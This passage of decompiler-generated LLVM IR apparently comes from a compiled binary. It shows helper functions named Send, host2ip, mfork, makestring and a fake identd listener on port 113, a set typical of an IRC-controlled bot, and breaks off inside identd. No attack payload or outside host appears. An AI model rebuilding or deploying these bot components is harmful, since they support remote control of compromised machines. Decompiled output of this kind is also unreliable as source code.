dec_label_pc_83c8:                                ; preds = %dec_label_pc_8384, %dec_label_pc_8394, %dec_label_pc_83c0
  %storemerge7 = phi i32 [ 0, %dec_label_pc_83c0 ], [ 1, %dec_label_pc_8394 ], [ 1, %dec_label_pc_8384 ]
  br label %dec_label_pc_85f0

dec_label_pc_83d4:                                ; preds = %dec_label_pc_8208
  %v1_83d8 = add i32 %tmp19, 1
  %v3_83e4 = inttoptr i32 %v1_83d8 to i8*
  %v4_83e4 = call i32 @strwildmatch(i8* %v3_83e4, i32 %arg2)
  %v2_83ec = icmp eq i32 %v4_83e4, 0
  br i1 %v2_83ec, label %dec_label_pc_8430, label %dec_label_pc_83f4

dec_label_pc_83f4:                                ; preds = %dec_label_pc_83d4
  %v2_83f8 = load i8, i8* %tmp, align 1
  %v2_83fc = icmp eq i8 %v2_83f8, 0
  br i1 %v2_83fc, label %dec_label_pc_8438, label %dec_label_pc_8404

dec_label_pc_8404:                                ; preds = %dec_label_pc_83f4
  %v1_8408 = add i32 %arg2, 1
  %v4_8414 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_8408)
  %v2_841c = icmp eq i32 %v4_8414, 0
  br i1 %v2_841c, label %dec_label_pc_8430, label %dec_label_pc_8438

dec_label_pc_8430:                                ; preds = %dec_label_pc_8404, %dec_label_pc_83d4
  br label %dec_label_pc_8438

dec_label_pc_8438:                                ; preds = %dec_label_pc_83f4, %dec_label_pc_8404, %dec_label_pc_8430
  %storemerge5 = phi i32 [ 0, %dec_label_pc_8430 ], [ 1, %dec_label_pc_8404 ], [ 1, %dec_label_pc_83f4 ]
  br label %dec_label_pc_85f0

dec_label_pc_8444:                                ; preds = %dec_label_pc_823c
  %v1_8448 = add i32 %tmp19, 1
  %v3_8454 = inttoptr i32 %v1_8448 to i8*
  %v4_8454 = call i32 @strwildmatch(i8* %v3_8454, i32 %arg2)
  %v2_845c = icmp eq i32 %v4_8454, 0
  br i1 %v2_845c, label %dec_label_pc_84a0, label %dec_label_pc_8464

dec_label_pc_8464:                                ; preds = %dec_label_pc_8444
  %v2_8468 = load i8, i8* %tmp, align 1
  %v2_846c = icmp eq i8 %v2_8468, 0
  br i1 %v2_846c, label %dec_label_pc_84a8, label %dec_label_pc_8474

dec_label_pc_8474:                                ; preds = %dec_label_pc_8464
  %v1_8478 = add i32 %arg2, 1
  %v4_8484 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_8478)
  %v2_848c = icmp eq i32 %v4_8484, 0
  br i1 %v2_848c, label %dec_label_pc_84a0, label %dec_label_pc_84a8

dec_label_pc_84a0:                                ; preds = %dec_label_pc_8474, %dec_label_pc_8444
  br label %dec_label_pc_84a8

dec_label_pc_84a8:                                ; preds = %dec_label_pc_8464, %dec_label_pc_8474, %dec_label_pc_84a0
  %storemerge4 = phi i32 [ 0, %dec_label_pc_84a0 ], [ 1, %dec_label_pc_8474 ], [ 1, %dec_label_pc_8464 ]
  br label %dec_label_pc_85f0

dec_label_pc_84b4:                                ; preds = %entry
  %v1_84b8 = add i32 %tmp19, 1
  %v3_84c4 = inttoptr i32 %v1_84b8 to i8*
  %v4_84c4 = call i32 @strwildmatch(i8* %v3_84c4, i32 %arg2)
  %v2_84cc = icmp eq i32 %v4_84c4, 0
  br i1 %v2_84cc, label %dec_label_pc_8510, label %dec_label_pc_84d4

dec_label_pc_84d4:                                ; preds = %dec_label_pc_84b4
  %v2_84d8 = load i8, i8* %tmp, align 1
  %v2_84dc = icmp eq i8 %v2_84d8, 0
  br i1 %v2_84dc, label %dec_label_pc_8518, label %dec_label_pc_84e4

dec_label_pc_84e4:                                ; preds = %dec_label_pc_84d4
  %v1_84e8 = add i32 %arg2, 1
  %v4_84f4 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_84e8)
  %v2_84fc = icmp eq i32 %v4_84f4, 0
  br i1 %v2_84fc, label %dec_label_pc_8510, label %dec_label_pc_8518

dec_label_pc_8510:                                ; preds = %dec_label_pc_84e4, %dec_label_pc_84b4
  br label %dec_label_pc_8518

dec_label_pc_8518:                                ; preds = %dec_label_pc_84d4, %dec_label_pc_84e4, %dec_label_pc_8510
  %storemerge9 = phi i32 [ 0, %dec_label_pc_8510 ], [ 1, %dec_label_pc_84e4 ], [ 1, %dec_label_pc_84d4 ]
  br label %dec_label_pc_85f0

dec_label_pc_8524:                                ; preds = %dec_label_pc_822c
  %v2_8528 = load i8, i8* %tmp, align 1
  %v2_852c = icmp eq i8 %v2_8528, 0
  br i1 %v2_852c, label %dec_label_pc_8570, label %dec_label_pc_8534

dec_label_pc_8534:                                ; preds = %dec_label_pc_8524
  %v1_8538 = add i32 %tmp19, 1
  %v1_8540 = add i32 %arg2, 1
  %v2_854c = inttoptr i32 %v1_8538 to i8*
  %v3_854c = call i32 @strwildmatch(i8* %v2_854c, i32 %v1_8540)
  %v2_8554 = icmp ne i32 %v3_854c, 0
  %. = zext i1 %v2_8554 to i32
  br label %dec_label_pc_8570

dec_label_pc_8570:                                ; preds = %dec_label_pc_8534, %dec_label_pc_8524
  %storemerge3 = phi i32 [ 1, %dec_label_pc_8524 ], [ %., %dec_label_pc_8534 ]
  br label %dec_label_pc_85f0

dec_label_pc_857c:                                ; preds = %dec_label_pc_8264, %dec_label_pc_823c, %dec_label_pc_822c
  %v2_8580 = load i8, i8* %arg1, align 1
  %v3_8580 = zext i8 %v2_8580 to i32
  %v1_8588 = call i32 @__GI_toupper(i32 %v3_8580)
  store i32 %v1_8588, i32* @r4, align 4
  %v2_8594 = load i8, i8* %tmp, align 1
  %v3_8594 = zext i8 %v2_8594 to i32
  %v1_859c = call i32 @__GI_toupper(i32 %v3_8594)
  %v0_85a4 = load i32, i32* @r4, align 4
  %v9_85a4 = icmp eq i32 %v0_85a4, %v1_859c
  br i1 %v9_85a4, label %dec_label_pc_85ac, label %dec_label_pc_85e8

dec_label_pc_85ac:                                ; preds = %dec_label_pc_857c
  %v1_85b0 = add i32 %tmp19, 1
  %v1_85b8 = add i32 %arg2, 1
  %v2_85c4 = inttoptr i32 %v1_85b0 to i8*
  %v3_85c4 = call i32 @strwildmatch(i8* %v2_85c4, i32 %v1_85b8)
  %v2_85cc = icmp ne i32 %v3_85c4, 0
  %.18 = zext i1 %v2_85cc to i32
  br label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85ac, %dec_label_pc_857c
  %storemerge = phi i32 [ 1, %dec_label_pc_857c ], [ %.18, %dec_label_pc_85ac ]
  br label %dec_label_pc_85f0

dec_label_pc_85f0:                                ; preds = %dec_label_pc_8570, %dec_label_pc_8518, %dec_label_pc_84a8, %dec_label_pc_8438, %dec_label_pc_83c8, %dec_label_pc_8358, %dec_label_pc_82e8, %dec_label_pc_8274, %dec_label_pc_85e8
  %stack_var_-64.0 = phi i32 [ %storemerge9, %dec_label_pc_8518 ], [ %storemerge8, %dec_label_pc_8358 ], [ %storemerge7, %dec_label_pc_83c8 ], [ %storemerge6, %dec_label_pc_82e8 ], [ %storemerge, %dec_label_pc_85e8 ], [ %storemerge5, %dec_label_pc_8438 ], [ %storemerge4, %dec_label_pc_84a8 ], [ %v3_8278, %dec_label_pc_8274 ], [ %storemerge3, %dec_label_pc_8570 ]
  store i32 %v3_81d0, i32* @r4, align 4
  store i32 %v6_81d0, i32* @fp, align 4
  ret i32 %stack_var_-64.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp19, { 3, 0, 7, 1, 2, 5, 6, 4 }
  uselistorder i8* %tmp, { 4, 0, 8, 2, 3, 6, 7, 5, 1 }
  uselistorder i32 (i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 13, 12, 0, 1, 10, 11, 8, 9, 4, 5, 2, 3, 6, 7, 14 }
  uselistorder i8* %arg1, { 2, 6, 0, 1, 4, 5, 3, 7, 8 }
  uselistorder label %dec_label_pc_85f0, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_8518, { 2, 1, 0 }
  uselistorder label %dec_label_pc_84a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8438, { 2, 1, 0 }
  uselistorder label %dec_label_pc_83c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8358, { 2, 1, 0 }
  uselistorder label %dec_label_pc_82e8, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8608 = load i32, i32* @fp, align 4
  store i32 34320, i32* %stack_var_-16, align 4
  %v2_860c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_860c, i32* @fp, align 4
  %v4_861c = ptrtoint i32* %stack_var_-8 to i32
  store i32 ptrtoint (i8** @global_var_2ac2c.37 to i32), i32* @r0, align 4
  %v4_8630 = call i32 @vsprintf(i32 ptrtoint (i8** @global_var_2ac2c.37 to i32), i32 %arg2, i32 %v4_861c)
  %v3_8638 = call i32 @strlen(i8* bitcast (i8** @global_var_2ac2c.37 to i8*))
  store i32 %arg1, i32* @r0, align 4
  store i32 ptrtoint (i8** @global_var_2ac2c.37 to i32), i32* @r1, align 4
  store i32 %v3_8638, i32* @r2, align 4
  %v0_864c = call i32 @write()
  store i32 %v3_8608, i32* @fp, align 4
  ret i32 %v0_864c

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_2ac2c.37 to i32), { 2, 0, 1 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8668 = load i32, i32* @fp, align 4
  store i32 34416, i32* %stack_var_-4, align 4
  %v2_866c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_866c, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  store i32 %arg2, i32* @r0, align 4
  %v1_8680 = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_8680, i32* @global_var_2b02c.39, align 4
  %v3_8698 = icmp eq i32 %v1_8680, -1
  br i1 %v3_8698, label %dec_label_pc_86a0, label %dec_label_pc_8704

dec_label_pc_86a0:                                ; preds = %entry
  %v3_86a0 = load i32, i32* %stack_var_-28, align 4
  %v1_86a4 = call i32 @__GI_gethostbyname(i32 %v3_86a0)
  %v2_86b4 = icmp eq i32 %v1_86a4, 0
  br i1 %v2_86b4, label %dec_label_pc_86bc, label %dec_label_pc_86e0

dec_label_pc_86bc:                                ; preds = %dec_label_pc_86a0
  %v2_86c0 = load i32, i32* @global_var_2f53c.41, align 4
  %v4_86d4 = call i32 @Send(i32 %v2_86c0, i32 ptrtoint ([33 x i8]* @global_var_1c3bc.43 to i32), i32 %arg1)
  %v1_86dc = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_86e0

dec_label_pc_86e0:                                ; preds = %dec_label_pc_86a0, %dec_label_pc_86bc
  %v1_86e4 = add i32 %v1_86a4, 16
  %v2_86e4 = inttoptr i32 %v1_86e4 to i32*
  %v3_86e4 = load i32, i32* %v2_86e4, align 4
  %v1_86e8 = inttoptr i32 %v3_86e4 to i32*
  %v2_86e8 = load i32, i32* %v1_86e8, align 4
  %v1_86f4 = add i32 %v1_86a4, 12
  %v2_86f4 = inttoptr i32 %v1_86f4 to i32*
  %v3_86f4 = load i32, i32* %v2_86f4, align 4
  store i32 %v3_86f4, i32* @r2, align 4
  %v3_8700 = call i32 @bcopy(i32 %v2_86e8, i32 ptrtoint (i32* @global_var_2b02c.39 to i32), i32 %v3_86f4)
  %v2_8708.pre = load i32, i32* @global_var_2b02c.39, align 4
  br label %dec_label_pc_8704

dec_label_pc_8704:                                ; preds = %entry, %dec_label_pc_86e0
  %v2_8708 = phi i32 [ %v1_8680, %entry ], [ %v2_8708.pre, %dec_label_pc_86e0 ]
  store i32 %v3_8668, i32* @fp, align 4
  ret i32 %v2_8708

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_2b02c.39, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8704, { 1, 0 }
  uselistorder label %dec_label_pc_86e0, { 1, 0 }
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_8728 = load i32, i32* @fp, align 4
  store i32 34608, i32* %stack_var_-4, align 4
  %v2_872c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_872c, i32* @fp, align 4
  %v2_873c = load i8, i8* bitcast (i8** @global_var_2ac1c.45 to i8*), align 4
  %v7_8740 = icmp eq i8 %v2_873c, 1
  br i1 %v7_8740, label %dec_label_pc_8748, label %dec_label_pc_876c

dec_label_pc_8748:                                ; preds = %entry
  %v2_874c = load i32, i32* @global_var_2f53c.41, align 4
  %v4_875c = call i32 @Send(i32 %v2_874c, i32 ptrtoint ([30 x i8]* @global_var_1c3e0.48 to i32), i32 %arg1)
  br label %dec_label_pc_8870

dec_label_pc_876c:                                ; preds = %entry
  %v0_876c = call i32 @fork()
  %v2_877c = icmp eq i32 %v0_876c, 0
  br i1 %v2_877c, label %dec_label_pc_8784, label %dec_label_pc_8790

dec_label_pc_8784:                                ; preds = %dec_label_pc_876c
  br label %dec_label_pc_8870

dec_label_pc_8790:                                ; preds = %dec_label_pc_876c
  %v2_8794 = load i32, i32* @global_var_2ac28.50, align 4
  %v1_8798 = add i32 %v2_8794, 1
  store i32 %v1_8798, i32* @global_var_2ac28.50, align 4
  %v3_87ac = mul i32 %v1_8798, 4
  %v1_87b0 = add i32 %v3_87ac, 4
  %v1_87b8 = call i32 @malloc(i32 %v1_87b0)
  %v2_881412 = load i32, i32* @global_var_2ac28.50, align 4
  %v9_882014 = icmp eq i32 %v2_881412, 1
  br i1 %v9_882014, label %dec_label_pc_8828, label %dec_label_pc_87d0

dec_label_pc_87d0:                                ; preds = %dec_label_pc_8790, %dec_label_pc_87d0
  %storemerge116 = phi i32 [ %v1_8808, %dec_label_pc_87d0 ], [ 0, %dec_label_pc_8790 ]
  %v3_87d4 = mul i32 %storemerge116, 4
  %v2_87e0 = add i32 %v3_87d4, %v1_87b8
  %v2_87f4 = load i32, i32* @global_var_2f554.52, align 4
  %v2_87f8 = add i32 %v2_87f4, %v3_87d4
  %v1_87fc = inttoptr i32 %v2_87f8 to i32*
  %v2_87fc = load i32, i32* %v1_87fc, align 4
  %v2_8800 = inttoptr i32 %v2_87e0 to i32*
  store i32 %v2_87fc, i32* %v2_8800, align 4
  %v1_8808 = add i32 %storemerge116, 1
  %v2_8814 = load i32, i32* @global_var_2ac28.50, align 4
  %v1_8818 = add i32 %v2_8814, -1
  %tmp = icmp ugt i32 %v1_8818, %v1_8808
  br i1 %tmp, label %dec_label_pc_87d0, label %dec_label_pc_8810.dec_label_pc_8828_crit_edge

dec_label_pc_8810.dec_label_pc_8828_crit_edge:    ; preds = %dec_label_pc_87d0
  br label %dec_label_pc_8828

dec_label_pc_8828:                                ; preds = %dec_label_pc_8790, %dec_label_pc_8810.dec_label_pc_8828_crit_edge
  %v2_8814.lcssa = phi i32 [ %v2_8814, %dec_label_pc_8810.dec_label_pc_8828_crit_edge ], [ %v2_881412, %dec_label_pc_8790 ]
  %v3_8830 = mul i32 %v2_8814.lcssa, 4
  %v2_883c = add i32 %v1_87b8, -4
  %v1_8840 = add i32 %v2_883c, %v3_8830
  %v2_8848 = inttoptr i32 %v1_8840 to i32*
  store i32 %v0_876c, i32* %v2_8848, align 4
  %v2_8850 = load i32, i32* @global_var_2f554.52, align 4
  store i32 %v2_8850, i32* @r0, align 4
  %v0_8858 = call i32 @free()
  store i32 %v1_87b8, i32* @global_var_2f554.52, align 4
  br label %dec_label_pc_8870

dec_label_pc_8870:                                ; preds = %dec_label_pc_8784, %dec_label_pc_8748, %dec_label_pc_8828
  %v3_8870 = phi i32 [ 0, %dec_label_pc_8784 ], [ 1, %dec_label_pc_8748 ], [ %v0_876c, %dec_label_pc_8828 ]
  store i32 %v3_8728, i32* @fp, align 4
  ret i32 %v3_8870

; uselistorder directives
  uselistorder i32 %v3_87d4, { 1, 0 }
  uselistorder i32 %storemerge116, { 1, 0 }
  uselistorder i32 %v2_881412, { 1, 0 }
  uselistorder i32 %v1_87b8, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8870, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8828, { 1, 0 }
  uselistorder label %dec_label_pc_87d0, { 1, 0 }
}

define i32 @filter(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8894 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8894, i32* @ip, align 4
  store i8* %arg1, i8** %stack_var_-20, align 4
  br label %dec_label_pc_88d0

dec_label_pc_88ac:                                ; preds = %dec_label_pc_88f8, %dec_label_pc_88d0
  %v3_88ac = phi i8* [ %v3_8908, %dec_label_pc_88f8 ], [ %v3_88e0, %dec_label_pc_88d0 ]
  %v3_88b0 = call i32 @strlen(i8* %v3_88ac)
  %v3_88bc = load i8*, i8** %stack_var_-20, align 4
  %v4_88bc = ptrtoint i8* %v3_88bc to i32
  %v2_88c0 = add i32 %v3_88b0, -1
  %v1_88c4 = add i32 %v2_88c0, %v4_88bc
  %v3_88cc = inttoptr i32 %v1_88c4 to i8*
  store i8 0, i8* %v3_88cc, align 1
  %v3_88d0.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_88d0

dec_label_pc_88d0:                                ; preds = %entry, %dec_label_pc_88ac
  %v3_88d0 = phi i8* [ %arg1, %entry ], [ %v3_88d0.pre, %dec_label_pc_88ac ]
  %v3_88d4 = call i32 @strlen(i8* %v3_88d0)
  %v3_88e0 = load i8*, i8** %stack_var_-20, align 4
  %v4_88e0 = ptrtoint i8* %v3_88e0 to i32
  %v2_88e4 = add i32 %v3_88d4, -1
  %v1_88e8 = add i32 %v2_88e4, %v4_88e0
  %v1_88ec = inttoptr i32 %v1_88e8 to i8*
  %v2_88ec = load i8, i8* %v1_88ec, align 1
  %v7_88f0 = icmp eq i8 %v2_88ec, 13
  br i1 %v7_88f0, label %dec_label_pc_88ac, label %dec_label_pc_88f8

dec_label_pc_88f8:                                ; preds = %dec_label_pc_88d0
  %v3_88fc = call i32 @strlen(i8* %v3_88e0)
  %v3_8908 = load i8*, i8** %stack_var_-20, align 4
  %v4_8908 = ptrtoint i8* %v3_8908 to i32
  %v2_890c = add i32 %v3_88fc, -1
  %v1_8910 = add i32 %v2_890c, %v4_8908
  %v1_8914 = inttoptr i32 %v1_8910 to i8*
  %v2_8914 = load i8, i8* %v1_8914, align 1
  %v7_8918 = icmp eq i8 %v2_8914, 10
  br i1 %v7_8918, label %dec_label_pc_88ac, label %dec_label_pc_8920

dec_label_pc_8920:                                ; preds = %dec_label_pc_88f8
  ret i32 %v3_88fc

; uselistorder directives
  uselistorder i8* %v3_8908, { 1, 0 }
  uselistorder i8* %v3_88e0, { 1, 2, 0 }
  uselistorder i8** %stack_var_-20, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_88d0, { 1, 0 }
}

define i32 @makestring(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-1068 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8928 = load i32, i32* @r4, align 4
  %v6_8928 = load i32, i32* @fp, align 4
  store i32 35120, i32* %stack_var_-4, align 4
  %v2_892c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_892c, i32* @fp, align 4
  %v2_8934 = ptrtoint i32* %stack_var_-1068 to i32
  %v0_8938 = call i32 @random()
  %v2_8948 = srem i32 %v0_8938, 5
  %v1_8950 = add nsw i32 %v2_8948, 4
  %v1_895c = add nsw i32 %v2_8948, 5
  %v1_8964 = call i32 @malloc(i32 %v1_895c)
  store i32 %v1_895c, i32* @r2, align 4
  store i32 %v1_8964, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_8988 = call i32 @__GI_memset()
  store i32 ptrtoint ([16 x i8]* @global_var_1c400.54 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c410.56 to i32), i32* @r1, align 4
  %v3_8994 = call i32 @__GI_fopen(i32 ptrtoint ([16 x i8]* @global_var_1c400.54 to i32), i32 ptrtoint (i32* @global_var_1c410.56 to i32))
  %v2_89a4 = icmp eq i32 %v3_8994, 0
  br i1 %v2_89a4, label %dec_label_pc_89fc.preheader, label %dec_label_pc_8a10

dec_label_pc_89fc.preheader:                      ; preds = %entry
  %v5_8a0822 = icmp sgt i32 %v2_8948, -4
  br i1 %v5_8a0822, label %dec_label_pc_89b8, label %dec_label_pc_8aec

dec_label_pc_89b8:                                ; preds = %dec_label_pc_89fc.preheader, %dec_label_pc_89b8
  %storemerge323 = phi i32 [ %v1_89f4, %dec_label_pc_89b8 ], [ 0, %dec_label_pc_89fc.preheader ]
  %v2_89c4 = add i32 %storemerge323, %v1_8964
  store i32 %v2_89c4, i32* @r4, align 4
  %v0_89c8 = call i32 @random()
  %v2_89d8 = srem i32 %v0_89c8, 26
  %fold = add nsw i32 %v2_89d8, 65
  %v1_89ec = trunc i32 %fold to i8
  %v2_89ec = load i32, i32* @r4, align 4
  %v3_89ec = inttoptr i32 %v2_89ec to i8*
  store i8 %v1_89ec, i8* %v3_89ec, align 1
  %v1_89f4 = add nuw nsw i32 %storemerge323, 1
  %v5_8a08 = icmp slt i32 %v1_89f4, %v1_8950
  br i1 %v5_8a08, label %dec_label_pc_89b8, label %dec_label_pc_8aec

dec_label_pc_8a10:                                ; preds = %entry
  %v0_8a10 = call i32 @random()
  store i32 %v0_8a10, i32* @r4, align 4
  %v0_8a18 = call i32 @random()
  %v0_8a20 = load i32, i32* @r4, align 4
  %v2_8a20 = mul i32 %v0_8a20, %v0_8a18
  %v2_8a30 = srem i32 %v2_8a20, 45402
  %v5_8a7c30 = icmp slt i32 %v2_8a30, 0
  br i1 %v5_8a7c30, label %dec_label_pc_8a80, label %dec_label_pc_8a4c

dec_label_pc_8a4c:                                ; preds = %dec_label_pc_8a10, %dec_label_pc_8a4c
  %storemerge231 = phi i32 [ %v1_8a68, %dec_label_pc_8a4c ], [ 0, %dec_label_pc_8a10 ]
  %v3_8a60 = call i32 @fgets(i32 %v2_8934, i32 1024, i32 %v3_8994)
  %v1_8a68 = add nuw nsw i32 %storemerge231, 1
  %v5_8a7c = icmp slt i32 %storemerge231, %v2_8a30
  br i1 %v5_8a7c, label %dec_label_pc_8a4c, label %dec_label_pc_8a80

dec_label_pc_8a80:                                ; preds = %dec_label_pc_8a4c, %dec_label_pc_8a10
  store i32 1024, i32* @r2, align 4
  store i32 %v2_8934, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_8a94 = call i32 @__GI_memset()
  %v3_8aac = call i32 @fgets(i32 %v2_8934, i32 1024, i32 %v3_8994)
  %v1_8abc = bitcast i32* %stack_var_-1068 to i8*
  %v2_8abc = call i32 @filter(i8* %v1_8abc)
  store i32 %v1_8964, i32* @r0, align 4
  store i32 %v2_8934, i32* @r1, align 4
  store i32 %v1_8950, i32* @r2, align 4
  %v0_8ae0 = call i32 @memcpy()
  %v1_8ae8 = inttoptr i32 %v3_8994 to i8*
  %v2_8ae8 = call i32 @__GI_fclose(i8* %v1_8ae8)
  br label %dec_label_pc_8aec

dec_label_pc_8aec:                                ; preds = %dec_label_pc_89fc.preheader, %dec_label_pc_89b8, %dec_label_pc_8a80
  store i32 %v3_8928, i32* @r4, align 4
  store i32 %v6_8928, i32* @fp, align 4
  ret i32 %v1_8964

; uselistorder directives
  uselistorder i32 %v1_89f4, { 1, 0 }
  uselistorder i32 %v1_8964, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8aec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8a4c, { 1, 0 }
  uselistorder label %dec_label_pc_89b8, { 1, 0 }
}

define i32 @identd(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-1236 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_8b08 = load i32, i32* @fp, align 4
  store i32 %v3_8b08, i32* %stack_var_-16, align 4
  %v13_8b08 = ptrtoint i32* %stack_var_-16 to i32
  %v0_8b24 = call i32 @socket()
  %v7_8b34 = icmp eq i32 %v0_8b24, -1
  br i1 %v7_8b34, label %dec_label_pc_8ed4, label %dec_label_pc_8b3c

dec_label_pc_8b3c:                                ; preds = %entry
  %v1_8b50 = call i32 @htons(i32 113)
  %v0_8b94 = call i32 @bind()
  %v7_8b9c = icmp eq i32 %v0_8b94, -1
  br i1 %v7_8b9c, label %dec_label_pc_8ed4, label %dec_label_pc_8ba4

dec_label_pc_8ba4:                                ; preds = %dec_label_pc_8b3c
  %v0_8bac = call i32 @listen()
  %v7_8bb4 = icmp eq i32 %v0_8bac, -1
  br i1 %v7_8bb4, label %dec_label_pc_8ed4, label %dec_label_pc_8bbc

dec_label_pc_8bbc:                                ; preds = %dec_label_pc_8ba4
  %v0_8bbc = call i32 @fork()
  %v2_8bc4 = icmp eq i32 %v0_8bbc, 0
  br i1 %v2_8bc4, label %dec_label_pc_8ed4, label %dec_label_pc_8bcc

dec_label_pc_8bcc:                                ; preds = %dec_label_pc_8bbc
  store i32 16, i32* %stack_var_-44, align 4
  %v2_8bd4 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8bd8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8bd8, i32* @r2, align 4
  store i32 %v0_8b24, i32* @r0, align 4
  store i32 %v2_8bd4, i32* @r1, align 4
  %v0_8be4 = call i32 @accept()
  %v2_8bf4 = add i32 %v0_8be4, 1
  %v3_8bf4 = icmp eq i32 %v0_8be4, -1
  br i1 %v3_8bf4, label %dec_label_pc_8bfc, label %dec_label_pc_8c04.preheader

dec_label_pc_8bfc:                                ; preds = %dec_label_pc_8bcc
  %v1_8c00 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8c04.preheader

dec_label_pc_8c04.preheader:                      ; preds = %dec_label_pc_8bfc, %dec_label_pc_8bcc
  %v2_8c0c = ptrtoint i32* %stack_var_-1236 to i32
  %v3_8c4c = udiv i32 %v0_8be4, 32
  %v3_8c60 = mul nuw nsw i32 %v3_8c4c, 4
  %v2_8c68 = add i32 %v3_8c60, %v13_8b08
  %v1_8c78 = urem i32 %v0_8be4, 32
  %v6_8c80 = shl i32 1, %v1_8c78
  %v2_8cd0 = ptrtoint i32* %stack_var_-1108 to i32
  %v2_8d1c = add i32 %v2_8c68, -1220
  %v1_8d20 = inttoptr i32 %v2_8d1c to i32*
  br label %dec_label_pc_8c20.lr.ph

dec_label_pc_8c20.lr.ph:                          ; preds = %dec_label_pc_8d00, %dec_label_pc_8c04.preheader
  br label %dec_label_pc_8c20

dec_label_pc_8c20:                                ; preds = %dec_label_pc_8c20.lr.ph, %dec_label_pc_8c20
  %storemerge26 = phi i32 [ 0, %dec_label_pc_8c20.lr.ph ], [ %v1_8c34, %dec_label_pc_8c20 ]
  %v5_8c2c = mul nuw nsw i32 %storemerge26, 4
  %v6_8c2c = add i32 %v5_8c2c, %v2_8c0c
  %v7_8c2c = inttoptr i32 %v6_8c2c to i32*
  store i32 0, i32* %v7_8c2c, align 4
  %v1_8c34 = add nuw nsw i32 %storemerge26, 1
  %tmp37 = icmp ult i32 %v1_8c34, 32
  br i1 %tmp37, label %dec_label_pc_8c20, label %dec_label_pc_8c48

dec_label_pc_8c48:                                ; preds = %dec_label_pc_8c20
  %v2_8c70 = load i32, i32* %v1_8d20, align 4
  %v2_8c84 = or i32 %v2_8c70, %v6_8c80
  store i32 %v2_8c84, i32* %v1_8d20, align 4
  store i32 60, i32* %stack_var_-1108, align 4
  %v5_8ce8 = call i32 @__libc_select(i32 %v2_8bf4, i32 %v2_8c0c, i32 0, i32 0, i32 %v2_8cd0)
  %v1_8cf0 = icmp slt i32 %v5_8ce8, 0
  br i1 %v1_8cf0, label %dec_label_pc_8cf8, label %dec_label_pc_8d00

dec_label_pc_8cf8:                                ; preds = %dec_label_pc_8c48
  %v1_8cfc = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8d00

dec_label_pc_8d00:                                ; preds = %dec_label_pc_8c48, %dec_label_pc_8cf8
  %v2_8d20 = load i32, i32* %v1_8d20, align 4
  %v6_8d2c1 = lshr i32 %v2_8d20, %v1_8c78
  %v1_8d34 = urem i32 %v6_8d2c1, 2
  %v2_8d38 = icmp eq i32 %v1_8d34, 0
  br i1 %v2_8d38, label %dec_label_pc_8c20.lr.ph, label %dec_label_pc_8d44

dec_label_pc_8d44:                                ; preds = %dec_label_pc_8d00
  %v2_8d4c = ptrtoint i32* %stack_var_-1100 to i32
  store i32 %v0_8be4, i32* @r0, align 4
  store i32 %v2_8d4c, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_8d60 = call i32 @recv()
  %tmp38 = icmp slt i32 %v0_8d60, 1
  br i1 %tmp38, label %dec_label_pc_8d84, label %dec_label_pc_8d78

dec_label_pc_8d78:                                ; preds = %dec_label_pc_8d44
